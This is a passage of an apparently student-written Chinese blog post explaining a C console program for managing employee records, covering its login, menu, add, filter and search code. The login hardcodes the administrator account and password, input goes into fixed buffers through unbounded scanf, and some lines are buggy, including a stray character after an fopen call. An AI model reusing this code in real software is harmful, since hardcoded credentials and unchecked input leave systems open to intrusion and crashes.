《职工信息管理系统》                   ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||                 请按相应按键使用本系统！                ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||   1.员工登录                       2.管理员模式         ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n&quot;);    scanf(&quot;%d&quot;,&amp;n);    char number[9];    char pow[10];    if(n&#x3D;&#x3D;2)    &#123;        printf(&quot;请输入管理员账号&quot;);        scanf(&quot;%s&quot;,number);        fflush(stdin);        printf(&quot;请输入密码&quot;);        &#123;            for(int i&#x3D;0; i&lt;9; i++)            &#123;                pow[i] &#x3D; getch();                &#x2F;*逐次赋值,但不回显*&#x2F;                if (pow[i] &#x3D;&#x3D; &#39;\x0d&#39;)                    &#x2F;*回车则终止循环*&#x2F;                &#123;                    pow[i]&#x3D;&#39;\0&#39;;                    break;                &#125;                printf(&quot;*&quot;);       &#x2F;*以星号代替字符个数*&#x2F;            &#125;            fflush(stdin);            if((strcmp(number,&quot;0001&quot;)&#x3D;&#x3D;0) &amp;&amp; (strcmp(pow,&quot;123456&quot;)&#x3D;&#x3D;0))            &#123;                return n;            &#125;            else                printf(&quot;账号或密码错误!&quot;);        &#125;    &#125;    else if(n&#x3D;&#x3D;1)    &#123;        f_3 (workers);        return n;    &#125;    else    &#123;        int n;        system(&quot;cls&quot;);        printf(&quot;请输入正确的功能编号!\n&quot;);        system(&quot;pause&quot;);        system(&quot;cls&quot;);        sign();    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>此处是登录页面</strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1 回显实际上存在问题，如果在输入过程中输入错误，想要把已经输入的数据删除的话，是无法完成的，因为使用的是<strong>getchar（）</strong>，<em>delete</em>实际上也是一种字符，这里是一个隐患。由于影响并不严重，不会影响到我的演示，就没有对这个问题进行修复。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2 管理员账号设置后无法更改，这点有点反人类，做出更改实际不难，但是这次实训三人小组实际上就我一个人负责，我真的不想再给自己找活干了。</p><h6 id="3-2-4操作页面"><a href="#3-2-4操作页面" class="headerlink" title="3.2.4操作页面"></a>3.2.4操作页面</h6><pre class="line-numbers language-none"><code class="language-none">int Hollow(void)&#x2F;&#x2F;管理员页面，在程序中会反复调用；&#123;    system(&quot;cls&quot;);    printf(&quot;\n\n\n\t\t\t&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||                   《职工信息管理系统》                  ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||                       管理员页面！                      ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||   1.新建职工信息                 2.浏览职工信息         ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||   3.查询职工信息                 4.删除职工信息         ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||   5.变更职工信息                 6.退出程序             ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n&quot;);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><center> 单纯的一个操作页面 </center>###### 3.2.5新建职工信息<pre class="line-numbers language-none"><code class="language-none">void f_1(struct workers *workers)&#x2F;&#x2F;以尾加法插入新的数据，并写入text.dat二进制文件中；&#123;    struct workers *p;    &#x2F;&#x2F;p是个指向结构体指针后面需要用到；    p &#x3D; (struct workers *)malloc(sizeof(struct workers));    &#x2F;&#x2F;对指针p分配大小；    p&#x3D;workers;    printf(&quot;请输入员工号:&quot;);    scanf(&quot;%s&quot;, p-&gt;jobNo);    printf(&quot;请输入姓名:&quot;);    scanf(&quot;%s&quot;, p-&gt;name);    printf(&quot;请输入性别:&quot;);    scanf(&quot;%s&quot;, p-&gt;sex);    printf(&quot;请输入所担任职务:&quot;);    scanf(&quot;%s&quot;, p-&gt;position);    printf(&quot;请输入年龄：&quot;);    scanf(&quot;%s&quot;,p-&gt;year);    printf(&quot;请输入工资:&quot;);    scanf(&quot;%s&quot;, p-&gt;salary);    printf(&quot;请输入家庭住址：&quot;);    scanf(&quot;%s&quot;, p-&gt;addr);    printf(&quot;请输入员工联系方式：&quot;);    scanf(&quot;%s&quot;, p-&gt;tel);    FILE *fp&#x3D;fopen(&quot;text.dat&quot;,&quot;ab+&quot;);    if (fp&#x3D;&#x3D;NULL)    &#123;        printf(&quot;文件打开失败&quot;);        exit(EXIT_FAILURE);        &#x2F;&#x2F;这段程序是结束函数块的，如果没有这段代码后面内容还会继续输出。    &#125;    fwrite(workers,sizeof(struct workers),1,fp);    &#x2F;&#x2F;将数据存入函数中；    fclose(fp);    char ch[10];    NUM++;    sprintf(ch,&quot;%d&quot;,&amp;NUM);    FILE *fp1;    fp1&#x3D;fopen(&quot;data.txt&quot;,&quot;w+&quot;);    itoa(NUM,ch, 10);    &#x2F;&#x2F;一个没学过的函数，把整形数转化成字符型；    fputs(ch,fp1);    fclose(fp1);    system(&quot;cls&quot;);    &#x2F;*    使用外部变量NUM，在使用者使用程序时先行为，NUM赋值；    *&#x2F;    Hollow();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>实现增添的一个程序块，主要功能**以追加的形式将数据存入二进制文件，并且将从文本文件中读取的NUM值自增，并将NUM重新存入文本文件中。**解释说明：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1 由于每个程序块没有返回值的需要，函数就使用了没有返回值的void类型&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2  **FILE** * **fp=fopen("text.dat","ab+");**以追加方式打开text.dat这个二进制文件 ，再使用**fwrite(workers,sizeof(struct workers),1,fp);**语句将一个大小为sizeof(struct workers)的结构体变量workers写入二进制文件中。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3 我在这里使用了itoa（）这个函数,函数原型为> char *itoa( int value, char *string,int radix)***value***：欲转换的数据。***string***：目标字符串的地址。***radix***： 转换后的进制数，可以是10进制、16进制等。同刚刚使用的atoi函数itoa函数也可以用格式化写函数fprintf（）解决，终究还是多此一举了。<h5 id="3-2-6浏览（筛选）职工信息："><a href="#3-2-6浏览（筛选）职工信息：" class="headerlink" title="3.2.6浏览（筛选）职工信息："></a>3.2.6浏览（筛选）职工信息：</h5><pre class="line-numbers language-none"><code class="language-none">void f_2(struct workers *workers)&#x2F;&#x2F;浏览已经写入的数据；&#123;    system(&quot;cls&quot;);    printf(&quot;\n\n\n\t\t\t&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||   1.浏览全部信息                 2.按性别方式筛选       ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||   3.按年龄方式筛选               4.按薪资筛选           ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n&quot;);    int n;    printf(&quot;请输入筛选的方式\n&quot;);    scanf(&quot;%d&quot;,&amp;n);    if(n&#x3D;&#x3D;1)    &#123;        system(&quot;cls&quot;);        struct workers read[100],*p;        FILE *fp&#x3D;fopen(&quot;text.dat&quot;,&quot;rb+&quot;);        if (fp&#x3D;&#x3D;NULL)        &#123;            printf(&quot;文件打开失败&quot;);            exit(EXIT_FAILURE);        &#125;        fread(read,sizeof(struct workers),100,fp);        int i;        for (i&#x3D;0; i&lt;NUM; i++)        &#123;            p&#x3D;&amp;read[i];            if(read[i].jobNo)            &#123;                printf(&quot;——————————————————————————————\n&quot;);                printf(&quot;|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n&quot;);                printf(&quot;|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n &quot;,p-&gt;jobNo, p-&gt;name, p-&gt;sex, p-&gt;year,p-&gt;position, p-&gt;salary, p-&gt;addr, p-&gt;tel);                printf(&quot;—————————————————————————————\n&quot;);            &#125;        &#125;        system(&quot;pause&quot;);        system(&quot;cls&quot;);        Hollow();    &#125;    else if(n&#x3D;&#x3D;2)    &#123;        int k;        system(&quot;cls&quot;);        printf(&quot;请输入要筛选的员工性别编号\n&quot;);        printf(&quot;1.男性    \t\t     2.女性\n&quot;);        scanf(&quot;%d&quot;,&amp;k);        struct workers read[100],*p;        FILE *fp&#x3D;fopen(&quot;text.dat&quot;,&quot;rb+&quot;);        if (fp&#x3D;&#x3D;NULL)        &#123;            printf(&quot;文件打开失败&quot;);            exit(EXIT_FAILURE);        &#125;        fread(read,sizeof(struct workers),100,fp);        if (k&#x3D;&#x3D;1)        &#123;            int i;            for (i&#x3D;0; i&lt;NUM; i++)            &#123;                p&#x3D;&amp;read[i];                if(strcmp(read[i].sex,&quot;男&quot;)&#x3D;&#x3D;0)                &#123;                    printf(&quot;——————————————————————————————\n&quot;);                    printf(&quot;|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n&quot;);                    printf(&quot;|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n &quot;,p-&gt;jobNo, p-&gt;name, p-&gt;sex, p-&gt;year,p-&gt;position, p-&gt;salary, p-&gt;addr, p-&gt;tel);                    printf(&quot;—————————————————————————————\n&quot;);                &#125;            &#125;            system(&quot;pause&quot;);            system(&quot;cls&quot;);            Hollow();        &#125;        else if (k&#x3D;&#x3D;2)        &#123;            int i;            for (i&#x3D;0; i&lt;NUM; i++)            &#123;                p&#x3D;&amp;read[i];                if(strcmp(read[i].sex,&quot;女&quot;)&#x3D;&#x3D;0)                &#123;                    printf(&quot;——————————————————————————————\n&quot;);                    printf(&quot;|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n&quot;);                    printf(&quot;|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n &quot;,p-&gt;jobNo, p-&gt;name, p-&gt;sex, p-&gt;year,p-&gt;position, p-&gt;salary, p-&gt;addr, p-&gt;tel);                    printf(&quot;—————————————————————————————\n&quot;);                &#125;            &#125;            system(&quot;pause&quot;);            system(&quot;cls&quot;);            Hollow();        &#125;        else        &#123;            printf(&quot;你好像想查询什么奇奇怪怪的东西！\n&quot;);            system(&quot;pause&quot;);            system(&quot;cls&quot;);            Hollow();        &#125;    &#125;    else if(n&#x3D;&#x3D;3)    &#123;        int k;        system(&quot;cls&quot;);        printf(&quot;请输入要筛选的员工薪资范围\n&quot;);        printf(&quot;1.青年    \t\t     2.壮年\n&quot;);        scanf(&quot;%d&quot;,&amp;k);        struct workers read[100],*p;        FILE *fp&#x3D;fopen(&quot;text.dat&quot;,&quot;rb+&quot;);        if (fp&#x3D;&#x3D;NULL)        &#123;            printf(&quot;文件打开失败&quot;);            exit(EXIT_FAILURE);        &#125;        fread(read,sizeof(struct workers),100,fp);        if (k&#x3D;&#x3D;1)        &#123;            int i;            for (i&#x3D;0; i&lt;NUM; i++)            &#123;                p&#x3D;&amp;read[i];                if(atoi(read[i].year)&lt;30)                &#123;                    printf(&quot;——————————————————————————————\n&quot;);                    printf(&quot;|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n&quot;);                    printf(&quot;|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n &quot;,p-&gt;jobNo, p-&gt;name, p-&gt;sex, p-&gt;year,p-&gt;position, p-&gt;salary, p-&gt;addr, p-&gt;tel);                    printf(&quot;—————————————————————————————\n&quot;);                &#125;            &#125;            system(&quot;pause&quot;);            system(&quot;cls&quot;);            Hollow();        &#125;        else if (k&#x3D;&#x3D;2)        &#123;            int i;            for (i&#x3D;0; i&lt;NUM; i++)            &#123;                p&#x3D;&amp;read[i];                if(atoi(read[i].year)&gt;30)                &#123;                    printf(&quot;——————————————————————————————\n&quot;);                    printf(&quot;|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n&quot;);                    printf(&quot;|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n &quot;,p-&gt;jobNo, p-&gt;name, p-&gt;sex, p-&gt;year,p-&gt;position, p-&gt;salary, p-&gt;addr, p-&gt;tel);                    printf(&quot;—————————————————————————————\n&quot;);                &#125;            &#125;            system(&quot;pause&quot;);            system(&quot;cls&quot;);            Hollow();        &#125;        else        &#123;            printf(&quot;你好像想查询什么奇奇怪怪的东西！\n&quot;);            system(&quot;pause&quot;);            system(&quot;cls&quot;);            Hollow();        &#125;    &#125;    else if(n&#x3D;&#x3D;4)    &#123;        int k;        system(&quot;cls&quot;);        printf(&quot;请输入要筛选的员工薪资范围\n&quot;);        printf(&quot;1.低薪    \t\t     2.中薪\t\t\t  3.高薪\n&quot;);        scanf(&quot;%d&quot;,&amp;k);        struct workers read[100],*p;        FILE *fp&#x3D;fopen(&quot;text.dat&quot;,&quot;rb+&quot;);        if (fp&#x3D;&#x3D;NULL)        &#123;            printf(&quot;文件打开失败&quot;);            exit(EXIT_FAILURE);        &#125;        fread(read,sizeof(struct workers),100,fp);        if (k&#x3D;&#x3D;1)        &#123;            int i;            for (i&#x3D;0; i&lt;NUM; i++)            &#123;                p&#x3D;&amp;read[i];                if(atoi(read[i].salary)&lt;3000)                &#123;                    printf(&quot;——————————————————————————————\n&quot;);                    printf(&quot;|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n&quot;);                    printf(&quot;|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n &quot;,p-&gt;jobNo, p-&gt;name, p-&gt;sex, p-&gt;year,p-&gt;position, p-&gt;salary, p-&gt;addr, p-&gt;tel);                    printf(&quot;—————————————————————————————\n&quot;);                &#125;            &#125;            system(&quot;pause&quot;);            system(&quot;cls&quot;);            Hollow();        &#125;        else if (k&#x3D;&#x3D;2)        &#123;            int i;            for (i&#x3D;0; i&lt;NUM; i++)            &#123;                p&#x3D;&amp;read[i];                if(atoi(read[i].salary)&gt;&#x3D;3000&amp;&amp;atoi(read[i].salary)&lt;8000)                &#123;                    printf(&quot;——————————————————————————————\n&quot;);                    printf(&quot;|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n&quot;);                    printf(&quot;|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n &quot;,p-&gt;jobNo, p-&gt;name, p-&gt;sex, p-&gt;year,p-&gt;position, p-&gt;salary, p-&gt;addr, p-&gt;tel);                    printf(&quot;—————————————————————————————\n&quot;);                &#125;            &#125;            system(&quot;pause&quot;);            system(&quot;cls&quot;);            Hollow();        &#125;        else if(k&#x3D;&#x3D;3)        &#123;            int i;            for (i&#x3D;0; i&lt;NUM; i++)            &#123;                p&#x3D;&amp;read[i];                if(atoi(read[i].salary)&gt;&#x3D;8000)                &#123;                    printf(&quot;——————————————————————————————\n&quot;);                    printf(&quot;|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n&quot;);                    printf(&quot;|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n &quot;,p-&gt;jobNo, p-&gt;name, p-&gt;sex, p-&gt;year,p-&gt;position, p-&gt;salary, p-&gt;addr, p-&gt;tel);                    printf(&quot;—————————————————————————————\n&quot;);                &#125;            &#125;            system(&quot;pause&quot;);            system(&quot;cls&quot;);            Hollow();        &#125;        else        &#123;            printf(&quot;你好像想查询什么奇奇怪怪的东西！\n&quot;);            system(&quot;pause&quot;);            system(&quot;cls&quot;);            Hollow();        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这一模块一开始计划是只是浏览全部的员工信息，在后期的实训过程中，想到一个公司经常会有各种活动，需要对参与员工进行筛选，对其追加了根据年龄，工资与性别的筛选功能。<br>解释说明：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1  浏览只需要将全部数据从二进制文件中读取到结构体，通过for循环将所有的数据输出到屏幕中。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2 关于筛选其实可以做的更好，比如说以年龄方式筛选的时候可以让使用者自己输入筛选的年龄范围，而不是我自己预先设定好的青年，壮年。同样按工资进行查询时同样也可以让使用者设置自己的筛选范围，这样可能对使用者更加友好。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3 第三点我曾经试图做出复合的筛选程序，只是感觉会过于复杂就没有做，大体的思路和现在一样，但是同时选择多种筛选方式，并对二进制文件中的数据进行复合筛选，找到需要的数据。</p><h5 id="3-2-7查找职工信息："><a href="#3-2-7查找职工信息：" class="headerlink" title="3.2.7查找职工信息："></a>3.2.7查找职工信息：</h5><pre class="line-numbers language-none"><code class="language-none">void f_3_1(struct workers *n)&#x2F;&#x2F;以员工号方式查询某个员工的信息。&#123;    system(&quot;cls&quot;);    struct workers read[100],*p;    FILE *fp&#x3D;fopen(&quot;text.dat&quot;,&quot;rb+&quot;);a    if (fp&#x3D;&#x3D;NULL)    &#123;        printf(&quot;文件打开失败&quot;);        exit(EXIT_FAILURE);    &#125;    fread(read,sizeof(struct workers),100,fp);    char found[100];    fclose(fp);    printf(&quot;\n请输入你要查询的职工的职工号：&quot;);    scanf(&quot;%s&quot;, found);    int i;    for (i&#x3D;0; i&lt;100; i++)    &#123;        p&#x3D;&amp;read[i];        if(strcmp(read[i].jobNo,found)&#x3D;&#x3D;0)        &#123;            printf(&quot;——————————————————————————————\n&quot;);            printf(&quot;|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n&quot;);            printf(&quot;|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n &quot;,p-&gt;jobNo, p-&gt;name, p-&gt;sex, p-&gt;year,p-&gt;position, p-&gt;salary, p-&gt;addr, p-&gt;tel);            printf(&quot;—————————————————————————————\n&quot;);            break;        &#125;    &#125;    if (i&#x3D;&#x3D;100)    &#123;        printf(&quot;没有该员工！&quot;);    &#125;    system(&quot;pause&quot;);    system(&quot;cls&quot;);    Hollow();&#125;void f_3(struct workers *n)&#x2F;&#x2F;以员工号方式查询某个员工的信息。&#123;    system(&quot;cls&quot;);    struct workers read[100],*p;    FILE *fp&#x3D;fopen(&quot;text.dat&quot;,&quot;rb+&quot;);    if (fp&#x3D;&#x3D;NULL)    &#123;        printf(&quot;文件打开失败&quot;);        exit(EXIT_FAILURE);    &#125;    fread(read,sizeof(struct workers),100,fp);    char found[100];    fclose(fp);    printf(&quot;\n请输入你要查询的职工的职工号：&quot;);    scanf(&quot;%s&quot;, found);    int i;    for (i&#x3D;0; i&lt;100; i++)    &#123;        p&#x3D;&amp;read[i];        if(strcmp(read[i].jobNo,found)&#x3D;&#x3D;0)        &#123;            printf(&quot;——————————————————————————————\n&quot;);            printf(&quot;|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n&quot;);            printf(&quot;|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n &quot;,p-&gt;jobNo, p-&gt;name, p-&gt;sex, p-&gt;year,p-&gt;position, p-&gt;salary, p-&gt;addr, p-&gt;tel);            printf(&quot;—————————————————————————————\n&quot;);            break;        &#125;    &#125;    if (i&#x3D;&#x3D;100)    &#123;        printf(&quot;没有该员工！&quot;);    &#125;    system(&quot;pause&quot;);    system(&quot;cls&quot;);&#125;void f_3_2(struct workers *n)&#123;    &#x2F;&#x2F;以姓名方式查找员工；    system(&quot;cls&quot;);    struct workers read[100],*p;    FILE *fp&#x3D;fopen(&quot;text.dat&quot;,&quot;rb+&quot;);    if (fp&#x3D;&#x3D;NULL)    &#123;        printf(&quot;文件打开失败&quot;);        exit(EXIT_FAILURE);    &#125;    fread(read,sizeof(struct workers),100,fp);    char found[100];    fclose(fp);    printf(&quot;\n请输入你要查询的职工的姓名：&quot;);    scanf(&quot;%s&quot;, found);    int i;    for (i&#x3D;0; i&lt;100; i++)    &#123;        p&#x3D;&amp;read[i];        if(strcmp(read[i].name,found)&#x3D;&#x3D;0)            &#x2F;&#x2F;用found数组进行比较如果found数组和name相同则执行；        &#123;            printf(&quot;——————————————————————————————\n&quot;);            printf(&quot;|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n&quot;);            printf(&quot;|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n &quot;,p-&gt;jobNo, p-&gt;name, p-&gt;sex, p-&gt;year,p-&gt;position, p-&gt;salary, p-&gt;addr, p-&gt;tel);            printf(&quot;—————————————————————————————\n&quot;);            break;        &#125;    &#125;    if (i&#x3D;&#x3D;100)        &#x2F;&#x2F;当    &#123;        printf(&quot;没有该员工！&quot;);    &#125;    system(&quot;pause&quot;);    system(&quot;cls&quot;);    Hollow();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该模块对员工信息的查询功能包括两个方面，按员工号对员工信息进行查询和按照姓名方式进行查询，如果查询失败则输出没有该员工，返回操作页面。反之查询成功，输出查询到的数据。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1 这一块代码主要利用<strong>strcmp（）函数</strong>比较输入的员工号或者员工姓名与从二进制文件中读取到结构体块中的数据对比，如果strcmp返回值为0则查询成功。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2 这部分代码也有改进的地方由于各种原因没有实现。</p><h5 id="3-2-8删除员工信息"><a href="#3-2-8删除员工信息" class="headerlink" title="3.2.8删除员工信息"></a>3.2.8删除员工信息</h5><pre class="line-numbers language-none"><code class="language-none">int f_4(struct workers 